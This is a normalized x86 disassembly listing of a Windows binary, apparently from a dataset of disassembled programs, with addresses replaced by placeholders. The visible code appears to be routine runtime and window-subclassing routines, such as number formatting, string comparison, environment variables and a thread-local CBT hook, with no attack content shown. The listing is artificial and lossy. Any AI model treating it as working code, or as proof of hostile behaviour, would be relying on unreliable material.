cmp [ rw-data ] 0x1
jle r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
xor ebx ebx
mov eax 0x7fff
mov esi 0x80000000
xor edx edx
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
add eax [ ebp - 0x8 ]
cmp [ ebp - 0x20 ] ecx
jne r-xdata
neg eax
jmp r-xdata
cmp bl 0x43
jle r-xdata
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
xor edx edx
xor eax eax
xor esi esi
xor ebx ebx
mov [ ebp - 0x14 ] 0x1
cmp [ ebp - 0x24 ] ecx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp bl 0x45
jle r-xdata
cmp eax 0x1450
jle r-xdata
sub eax [ ebp + 0x1c ]
push 0x6
jmp r-xdata
cmp bl 0x63
jle r-xdata
cmp eax 0xffffebb0
jge r-xdata
mov [ ebp - 0x2c ] 0x1
cmp bl 0x65
jg r-xdata
push [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_416372
mov edx [ ebp - 0x40 ]
mov ebx [ ebp - 0x3e ]
mov esi [ ebp - 0x3a ]
mov eax [ ebp - 0x36 ]
add esp 0xc
jmp r-xdata
mov [ ebp - 0x30 ] 0x1
jmp r-xdata
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0x10 ]
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x10 ]
sub_415ca6
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x1c ]
push esi
mov ecx eax
mov esi 0x7fff
and ecx 0x8000
and eax esi
test cx cx
push edi
mov [ ebp - 0x1c ] 0xcc
mov [ ebp - 0x1b ] 0xcc
mov [ ebp - 0x1a ] 0xcc
mov [ ebp - 0x19 ] 0xcc
mov [ ebp - 0x18 ] 0xcc
mov [ ebp - 0x17 ] 0xcc
mov [ ebp - 0x16 ] 0xcc
mov [ ebp - 0x15 ] 0xcc
mov [ ebp - 0x14 ] 0xcc
mov [ ebp - 0x13 ] 0xcc
mov [ ebp - 0x12 ] 0xfb
mov [ ebp - 0x11 ] 0x3f
mov [ ebp - 0x4 ] 0x1
mov edx eax
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
cmp dx si
jne r-xdata
test edi edi
jne r-xdata
mov edi [ ebp + 0xc ]
test dx dx
jne r-xdata
movzx eax dx
mov ecx edi
mov esi eax
shr ecx 0x18
imul eax eax 0x4d10
shr esi 0x8
and [ ebp - 0x10 ] 0x0
push 0x1
lea ecx [ esi + ecx * 2 ]
mov [ ebp - 0x6 ] dx
imul ecx ecx 0x4d
mov [ ebp - 0xa ] edi
lea esi [ ecx + eax - 0x134312f4 ]
mov eax [ ebp + 0x8 ]
sar esi 0x10
mov [ ebp - 0xe ] eax
movsx eax si
neg eax
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_416372
add esp 0xc
cmp [ ebp - 0x6 ] 0x3fff
jb r-xdata
mov eax 0x80000000
mov [ ebx ] 0x1
cmp edi eax
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
test [ ebp + 0x18 ] 0x1
mov [ ebx ] si
je r-xdata
lea eax [ ebp - 0x1c ]
inc esi
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_416152
pop ecx
pop ecx
test edi 0x40000000
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
and [ ebx ] 0x0
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x3 ] 0x1
mov [ ebx + 0x4 ] 0x30
jmp r-xdata
mov edi [ ebp + 0x14 ]
mov edi [ ebp + 0x14 ]
movsx eax si
add edi eax
test edi edi
jg r-xdata
test cx cx
je r-xdata
push r--data
jmp r-xdata
and [ ebx + 0x5 ] 0x0
push 0x1
pop eax
jmp r-xdata
movzx esi [ ebp - 0x6 ]
sub esi 0x3ffe
and [ ebp - 0x6 ] 0x0
mov [ ebp + 0x1c ] 0x8
push 0x15
pop edi
cmp edi 0x15
jle r-xdata
jmp r-xdata
cmp edi eax
jne r-xdata
cmp edi 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push eax
call sub_412670
pop ecx
mov [ ebx + 0x3 ] 0x6
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x10 ]
push eax
call sub_4156b3
dec [ ebp + 0x1c ]
pop ecx
jne r-xdata
test esi esi
jge r-xdata
push r--data
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
lea ecx [ edi + 0x1 ]
lea eax [ ebx + 0x4 ]
test ecx ecx
mov [ ebp + 0x1c ] eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
push r--data
push r--data
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov cl [ eax - 0x1 ]
dec eax
dec eax
cmp cl 0x35
lea ecx [ ebx + 0x4 ]
jl r-xdata
mov [ ebp + 0x14 ] ecx
lea eax [ ebp - 0x10 ]
push eax
call sub_4156e1
dec esi
pop ecx
jne r-xdata
lea eax [ ebx + 0x4 ]
push eax
call sub_412670
pop ecx
mov [ ebx + 0x3 ] 0x5
pop ecx
cmp eax ecx
jb r-xdata
cmp eax ecx
jb r-xdata
lea esi [ ebp - 0x10 ]
lea edi [ ebp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
movsd [ edi ] [ esi ]
call sub_4156b3
lea eax [ ebp - 0x10 ]
push eax
call sub_4156b3
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_415655
lea eax [ ebp - 0x10 ]
push eax
call sub_4156b3
mov al [ ebp - 0x5 ]
mov ecx [ ebp + 0x1c ]
and [ ebp - 0x5 ] 0x0
add esp 0x14
add al 0x30
inc [ ebp + 0x1c ]
dec [ ebp + 0x14 ]
mov [ ecx ] al
jne r-xdata
mov eax [ ebp + 0x1c ]
and [ ebx ] 0x0
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x3 ] 0x1
mov [ ecx ] 0x30
cmp [ eax ] 0x30
jne r-xdata
inc eax
inc [ ebx ]
cmp [ eax ] 0x39
jne r-xdata
cmp eax ecx
jae r-xdata
dec eax
jmp r-xdata
cmp eax ecx
jae r-xdata
mov [ eax ] 0x30
dec eax
jmp r-xdata
sub al bl
sub al 0x3
mov [ ebx + 0x3 ] al
movsx eax al
and [ eax + ebx + 0x4 ] 0x0
inc [ eax ]
sub_415f39
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push [ rw-data ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
push 0x1
push [ rw-data ]
call sub_4163ee
add esp 0x1c
test eax eax
jne r-xdata
xor eax eax
pop ebp
retn
add eax 0xfffffffe
pop ebp
retn
mov eax 0x7fffffff
pop ebp
retn
sub_415f78
push ecx
push ebx
push ebp
push esi
mov esi [ rw-data ]
push edi
xor edi edi
mov eax [ esi ]
cmp eax edi
je r-xdata
xor eax eax
mov ebx [ WideCharToMultiByte@IAT ]
or eax 0xffffffff
jmp r-xdata
push ebp
call sub_40bb22
cmp eax edi
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push edi
push edi
push ebp
push eax
push 0xffffffff
push [ esi ]
push edi
push 0x1
call ebx
test eax eax
je r-xdata
push edi
push [ esp + 0x14 ]
call sub_41666b
mov eax [ esi + 0x4 ]
add esi 0x4
pop ecx
cmp eax edi
pop ecx
jne r-xdata
push edi
push edi
push edi
push edi
push 0xffffffff
push eax
push edi
push 0x1
call ebx
mov ebp eax
cmp ebp edi
je r-xdata
sub_415ff0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
lea eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
[ rw-data ]
cmp [ rw-data ] 0x0
jg r-xdata
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
[ rw-data ]
mov ebx ecx
push 0x13
call sub_40e83e
mov [ esp ] 0x1
mov ecx ebx
push 0x0
jmp r-xdata
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
xor ecx ecx
cmp eax ebx
je r-xdata
or ebx ebx
je r-xdata
xor eax eax
xor ebx ebx
mov edi edi
mov ecx 0xffffffff
jb r-xdata
inc esi
inc edi
cmp ah bh
jb r-xdata
pop eax
or eax eax
jne r-xdata
mov ecx 0xffffffff
jb r-xdata
inc esi
inc edi
push ecx
push eax
push ebx
call sub_414c8a
mov ebx eax
add esp 0x4
call sub_414c8a
add esp 0x4
pop ecx
cmp eax ebx
jne r-xdata
neg ecx
jmp r-xdata
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
mov ebx ecx
push 0x13
call sub_40e89f
add esp 0x4
mov ecx ebx
[ rw-data ]
jmp r-xdata
neg ecx
dec ecx
jne r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
mov al [ esi ]
or eax eax
mov bl [ edi ]
je r-xdata
dec ecx
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_4160f1
mov eax [ esp + 0x4 ]
push esi
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov esi 0x8000
mov ecx [ ecx * 4 + rw-data ]
lea edx [ ecx + eax * 4 + 0x4 ]
mov cl [ ecx + eax * 4 + 0x4 ]
mov al cl
and eax 0x80
cmp [ esp + 0xc ] esi
jne r-xdata
cmp [ esp + 0xc ] 0x4000
jne r-xdata
and cl 0x7f
jmp r-xdata
call sub_40e7ac
mov [ eax ] 0x16
or eax 0xffffffff
pop esi
retn
or cl 0x80
neg eax
sbb eax eax
mov [ edx ] cl
and ax 0xc000
add eax esi
pop esi
retn
sub_416152
push ebp
mov ebp esp
sub esp 0x24
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov cx [ ebx + 0xa ]
xor eax eax
push edi
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov ax [ esi + 0xa ]
mov edi ecx
mov edx 0x7fff
xor edi eax
and eax edx
and ecx edx
and edi 0x8000
cmp ax 0x7fff
lea edx [ ecx + eax ]
mov [ ebp + 0x8 ] edx
jae r-xdata
neg di
sbb edi edi
and [ esi + 0x4 ] 0x0
and edi 0x80000000
add edi 0x7fff8000
and [ esi ] 0x0
mov [ esi + 0x8 ] edi
cmp cx 0x7fff
jae r-xdata
cmp dx 0xbffd
ja r-xdata
cmp dx 0x3fbf
ja r-xdata
test ax ax
mov edx 0x7fffffff
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc [ ebp + 0x8 ]
test [ esi + 0x8 ] edx
jne r-xdata
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
mov [ esi ] eax
jmp r-xdata
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0xc ] 0x5
inc [ ebp + 0x8 ]
test [ ebx + 0x8 ] edx
jne r-xdata
xor eax eax
cmp [ esi + 0x4 ] eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
add [ ebp - 0x4 ] 0x2
inc [ ebp - 0x10 ]
dec [ ebp + 0xc ]
cmp [ ebp + 0xc ] 0x0
jg r-xdata
add eax esi
lea ecx [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x18 ] eax
cmp [ ebx + 0x4 ] eax
jne r-xdata
cmp cx ax
jne r-xdata
cmp [ esi ] eax
jne r-xdata
mov eax [ ebp - 0x10 ]
add eax eax
cmp [ ebp + 0xc ] 0x0
jle r-xdata
add [ ebp + 0x8 ] 0xc002
cmp [ ebp + 0x8 ] 0x0
jle r-xdata
add [ ebp - 0x8 ] 0x2
sub [ ebp - 0xc ] 0x2
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax ]
cmp [ ebx ] eax
jne r-xdata
jmp r-xdata
add [ ebp + 0x8 ] 0xffff
cmp [ ebp + 0x8 ] 0x0
jge r-xdata
test [ ebp - 0x19 ] 0x80
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
imul eax ecx
mov ecx [ ebp - 0x4 ]
add ecx 0xfffffffc
push ecx
push eax
push [ ecx ]
call sub_415634
add esp 0xc
test eax eax
je r-xdata
mov [ esi + 0xa ] ax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x8000
ja r-xdata
movsx eax [ ebp + 0x8 ]
neg eax
add [ ebp + 0x8 ] eax
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_4156b3
add [ ebp + 0x8 ] 0xffff
pop ecx
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ ebp - 0x22 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x24 ]
and eax 0x1ffff
cmp eax 0x18000
jne r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_4156e1
dec ebx
pop ecx
jne r-xdata
inc [ ebp - 0x14 ]
inc [ ebp - 0x22 ]
and [ ebp - 0x22 ] 0x0
cmp [ ebp - 0x1e ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp ax 0x7fff
jae r-xdata
test [ ebp - 0x24 ] 0x1
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov cx [ ebp - 0x22 ]
or eax edi
mov [ esi ] cx
mov ecx [ ebp - 0x20 ]
mov [ esi + 0x2 ] ecx
mov ecx [ ebp - 0x1c ]
mov [ esi + 0x6 ] ecx
inc [ ebp - 0x1e ]
jmp r-xdata
and [ ebp - 0x1e ] 0x0
cmp [ ebp - 0x1a ] 0xffff
jne r-xdata
or [ ebp - 0x24 ] 0x1
inc [ ebp - 0x1a ]
jmp r-xdata
inc [ ebp + 0x8 ]
mov [ ebp - 0x1a ] 0x8000
jmp r-xdata
sub_416372
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx rw-data
xor ecx ecx
sub ebx 0x60
cmp [ ebp + 0xc ] ecx
je r-xdata
pop ebx
leave
retn
jge r-xdata
cmp [ ebp + 0x10 ] ecx
jne r-xdata
mov eax [ ebp + 0xc ]
mov ebx rw-data
neg eax
mov [ ebp + 0xc ] eax
sub ebx 0x60
cmp [ ebp + 0xc ] ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] cx
push esi
push edi
cmp [ ebp + 0xc ] ecx
jne r-xdata
lea eax [ eax + eax * 2 ]
cmp [ ebx + eax * 4 ] 0x8000
lea esi [ ebx + eax * 4 ]
jb r-xdata
mov eax [ ebp + 0xc ]
add ebx 0x54
sar [ ebp + 0xc ] 0x3
and eax 0x7
cmp eax ecx
je r-xdata
pop edi
pop esi
push esi
push [ ebp + 0x8 ]
call sub_416152
pop ecx
pop ecx
xor ecx ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0xa ]
lea esi [ ebp - 0xc ]
sub_4163ee
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
cmp [ rw-data ] ebx
push 0x1
pop edi
jne r-xdata
mov esi [ ebp + 0x14 ]
cmp esi ebx
jle r-xdata
push edi
mov eax r--data
push eax
push edi
push eax
push ebx
push ebx
call [ CompareStringW@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x1c ] ebx
jle r-xdata
push esi
push [ ebp + 0x10 ]
call sub_412c9e
pop ecx
pop ecx
mov esi eax
mov [ ebp + 0x14 ] esi
push edi
mov eax r--data
push eax
push edi
push eax
push ebx
push ebx
call [ CompareStringA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov eax [ rw-data ]
cmp eax 0x2
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
call sub_412c9e
pop ecx
pop ecx
mov [ ebp + 0x1c ] eax
xor eax eax
mov [ rw-data ] 0x2
cmp eax edi
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringA@IAT ]
jmp r-xdata
cmp [ ebp + 0x20 ] ebx
jne r-xdata
lea esp [ ebp - 0x4c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp esi ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
cmp esi [ ebp + 0x1c ]
jne r-xdata
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp [ ebp + 0x1c ] edi
jle r-xdata
push 0x2
push ebx
push ebx
push esi
push [ ebp + 0x10 ]
push 0x9
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax ebx
je r-xdata
cmp esi edi
jg r-xdata
mov eax edi
jmp r-xdata
mov [ ebp - 0x4 ] ebx
add eax eax
add eax 0x3
and al 0xfc
call sub_40c4f0
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x3
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
push [ ebp + 0x20 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x24 ] ebx
je r-xdata
pop eax
jmp r-xdata
cmp esi ebx
jle r-xdata
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push esi
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x20 ]
mov esi [ MultiByteToWideChar@IAT ]
call esi
test eax eax
je r-xdata
cmp [ ebp + 0x1c ] ebx
jle r-xdata
cmp [ ebp - 0x3c ] 0x2
jb r-xdata
push ebx
push ebx
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push 0x9
push [ ebp + 0x20 ]
call esi
mov esi eax
mov [ ebp - 0x20 ] esi
cmp esi ebx
je r-xdata
cmp [ ebp - 0x3c ] 0x2
jb r-xdata
lea eax [ ebp - 0x36 ]
cmp [ ebp - 0x36 ] bl
je r-xdata
mov [ ebp - 0x4 ] edi
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_40c4f0
mov [ ebp - 0x18 ] esp
mov edi esp
mov [ ebp - 0x28 ] edi
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x36 ]
cmp [ ebp - 0x36 ] bl
je r-xdata
mov dl [ eax + 0x1 ]
cmp dl bl
je r-xdata
cmp edi ebx
je r-xdata
mov dl [ eax + 0x1 ]
cmp dl bl
je r-xdata
mov ecx [ ebp + 0x10 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
push esi
push edi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x18 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
inc eax
inc eax
cmp [ eax ] bl
jne r-xdata
cmp cl dl
jbe r-xdata
push esi
push edi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
jmp r-xdata
inc eax
inc eax
cmp [ eax ] bl
jne r-xdata
cmp cl dl
jbe r-xdata
jmp r-xdata
sub_41666b
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
je r-xdata
or eax 0xffffffff
push 0x3d
push [ ebp + 0x8 ]
call sub_40d3e0
mov esi eax
pop ecx
cmp esi edi
pop ecx
mov [ ebp - 0x8 ] esi
je r-xdata
cmp [ ebp + 0x8 ] esi
je r-xdata
mov eax [ rw-data ]
xor ebx ebx
cmp [ esi + 0x1 ] bl
sete bl
cmp eax [ rw-data ]
jne r-xdata
cmp eax edi
jne r-xdata
push eax
call sub_41684a
pop ecx
mov [ rw-data ] eax
sub esi [ ebp + 0x8 ]
mov edi [ rw-data ]
mov [ ebp - 0x4 ] edi
push esi
push [ ebp + 0x8 ]
call sub_4167f2
mov esi eax
pop ecx
test esi esi
pop ecx
jl r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
test ebx ebx
jne r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp ebx edi
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
xor eax eax
jmp r-xdata
test esi esi
jge r-xdata
test ebx ebx
je r-xdata
push 0x4
call sub_40bb22
cmp eax edi
pop ecx
mov [ rw-data ] eax
je r-xdata
call sub_415f78
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ esi * 4 + 0x8 ]
push eax
push edi
call sub_40c532
pop ecx
test eax eax
pop ecx
je r-xdata
neg esi
mov eax [ ebp + 0x8 ]
mov [ edi + esi * 4 ] eax
jmp r-xdata
push [ edi + esi * 4 ]
lea edi [ edi + esi * 4 ]
call sub_40c218
pop ecx
mov [ eax ] edi
cmp [ rw-data ] edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax + esi * 4 ] ecx
and [ eax + esi * 4 + 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax esi
shl eax 0x2
push eax
push [ ebp - 0x4 ]
call sub_40c532
pop ecx
test eax eax
pop ecx
je r-xdata
mov eax [ edi + 0x4 ]
inc esi
mov [ edi ] eax
add edi 0x4
jmp r-xdata
push 0x4
call sub_40bb22
cmp eax edi
pop ecx
mov [ rw-data ] eax
je r-xdata
push [ ebp + 0x8 ]
call sub_412760
inc eax
inc eax
push eax
call sub_40bb22
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov [ eax ] edi
push [ ebp + 0x8 ]
push esi
call sub_412670
mov eax esi
pop ecx
sub eax [ ebp + 0x8 ]
pop ecx
add eax [ ebp - 0x8 ]
and [ eax ] 0x0
inc eax
neg ebx
sbb ebx ebx
not ebx
and ebx eax
push ebx
push esi
call [ SetEnvironmentVariableA@IAT ]
push esi
call sub_40c218
pop ecx
mov [ rw-data ] eax
sub_4167f2
push esi
mov esi [ rw-data ]
push edi
mov eax [ esi ]
test eax eax
je r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
neg eax
mov edi [ esp + 0x10 ]
mov eax [ esi + 0x4 ]
add esi 0x4
test eax eax
jne r-xdata
mov eax [ esi ]
mov al [ eax + edi ]
cmp al 0x3d
je r-xdata
push edi
push eax
push [ esp + 0x14 ]
call sub_415f39
add esp 0xc
test eax eax
jne r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
jmp r-xdata
test al al
je r-xdata
pop edi
pop esi
retn
sub_41684a
push edi
mov edi [ esp + 0x8 ]
xor ecx ecx
test edi edi
jne r-xdata
cmp [ edi ] 0x0
lea eax [ edi + 0x4 ]
je r-xdata
xor eax eax
pop edi
retn
push ebx
push ebp
lea eax [ ecx * 4 + 0x4 ]
push esi
push eax
call sub_40bb22
mov esi eax
pop ecx
test esi esi
mov ebp esi
jne r-xdata
mov edx [ eax ]
inc ecx
add eax 0x4
test edx edx
jne r-xdata
mov eax [ edi ]
mov ebx edi
push 0x9
call sub_40cb90
pop ecx
and [ esi ] 0x0
mov eax ebp
pop esi
pop ebp
pop ebx
pop edi
retn
push eax
add ebx 0x4
call sub_40cc3f
mov [ esi ] eax
mov eax [ ebx ]
pop ecx
add esi 0x4
jmp r-xdata
test eax eax
je r-xdata
sub_416920
push esi
push edi
mov esi [ esp + 0xc ]
push esi
call sub_416900
add esp 0x4
mov edi eax
test edi edi
jne r-xdata
mov eax edi
pop edi
pop esi
retn
mov eax [ esp + 0x10 ]
cmp eax 0x6
jne r-xdata
lea eax [ eax + eax * 2 ]
mov edi [ eax * 8 + rw-data ]
mov edi [ rw-data ]
jmp r-xdata
push edi
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call [ SetPropA@IAT ]
sub_416970
sub esp 0x10
xor eax eax
mov ax [ rw-data ]
push esi
mov esi [ esp + 0x18 ]
push edi
push eax
mov edi [ GetPropA@IAT ]
push esi
call edi
test eax eax
jne r-xdata
pop edi
pop esi
add esp 0x10
retn
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call edi
test eax eax
jne r-xdata
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call edi
test eax eax
jne r-xdata
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call edi
test eax eax
jne r-xdata
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call edi
test eax eax
jne r-xdata
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call edi
test eax eax
jne r-xdata
push esi
call sub_416900
add esp 0x4
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x20 ]
push eax
push 0xfffffffc
push esi
call [ SetWindowLongA@IAT ]
push eax
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call [ SetPropA@IAT ]
push esi
call [ IsWindowUnicode@IAT ]
test eax eax
jne r-xdata
lea eax [ esp + 0x8 ]
push 0x10
push eax
push esi
call [ GetClassNameA@IAT ]
lea ecx [ esp + 0x8 ]
push rw-data
push ecx
call [ lstrcmpiA@IAT ]
test eax eax
sub_416a60
mov eax [ esp + 0x8 ]
sub esp 0x4
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x14 ]
push edi
push esi
mov edx [ rw-data ]
push eax
push ecx
push edx
call [ CallNextHookEx@IAT ]
mov edi eax
mov ecx [ rw-data ]
cmp [ esi + 0xc ] ecx
jne r-xdata
mov eax edi
pop edi
pop esi
add esp 0x4
retn 0xc
mov eax [ rw-data ]
push eax
call [ UnhookWindowsHookEx@IAT ]
cmp [ rw-data ] 0x35f
jb r-xdata
mov [ esp + 0x8 ] 0x1
push 0xfffffff0
mov eax [ esi + 0xc ]
push eax
call [ GetWindowLongA@IAT ]
mov [ esp + 0x8 ] 0x0
test al 0x4
jne r-xdata
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax [ rw-data ]
mov ecx [ esi + 0xc ]
push eax
push ecx
call sub_416970
add esp 0x8
lea eax [ esp + 0x8 ]
mov ecx [ esi + 0xc ]
push eax
push 0x0
push 0x11f0
push ecx
call [ SendMessageA@IAT ]
cmp [ esp + 0x8 ] 0x0
je r-xdata
sub_416b10
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov [ rw-data ] eax
mov [ rw-data ] ecx
call [ GetCurrentThreadId@IAT ]
push eax
mov ecx [ rw-data ]
push ecx
push sub_416a60
push 0x4
call [ SetWindowsHookExA@IAT ]
mov [ rw-data ] eax
retn
sub_416b50
mov eax [ esp + 0x14 ]
push ebx
push esi
push edi
mov esi [ esp + 0x10 ]
push eax
push esi
call sub_416920
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
mov ebx [ esp + 0x1c ]
add esp 0x8
push ecx
push edx
push ebx
push esi
push eax
call [ CallWindowProcA@IAT ]
mov edi eax
mov ebx [ RemovePropA@IAT ]
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call ebx
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call ebx
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_416bd0
push esi
mov esi rw-data
push esi
call sub_416bb0
add esp 0x4
add esi 0x4
cmp esi rw-data
jb r-xdata
push rw-data
call sub_416bb0
add esp 0x4
pop esi
retn
sub_416c00
mov eax [ esp + 0x8 ]
push esi
push 0xf00021
mov esi [ eax + 0x4 ]
mov edx [ eax ]
mov ecx [ eax + 0xc ]
sub ecx esi
mov eax [ eax + 0x8 ]
push ecx
sub eax edx
mov ecx [ esp + 0x10 ]
push eax
push esi
push edx
push ecx
call [ PatBlt@IAT ]
pop esi
retn
sub_416c30
mov eax [ esp + 0xc ]
sub esp 0x10
and eax 0xffff
push ebx
push esi
push edi
push ebp
mov ecx [ eax * 4 + rw-data ]
mov edi [ esp + 0x24 ]
push ecx
push edi
call [ SetBkColor@IAT ]
mov esi eax
mov ebx [ esp + 0x28 ]
lea ecx [ esp + 0x10 ]
mov eax [ ebx ]
mov edx [ ebx + 0x4 ]
mov ebp [ ebx + 0x8 ]
mov [ ecx ] eax
mov eax [ ebx + 0xc ]
mov [ ecx + 0x4 ] edx
mov [ ecx + 0x8 ] ebp
mov bp [ esp + 0x34 ]
mov [ ecx + 0xc ] eax
mov eax [ esp + 0x14 ]
inc eax
test bp 0x2
mov [ esp + 0x1c ] eax
je r-xdata
mov eax [ ebx + 0xc ]
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x10 ]
inc eax
test bp 0x1
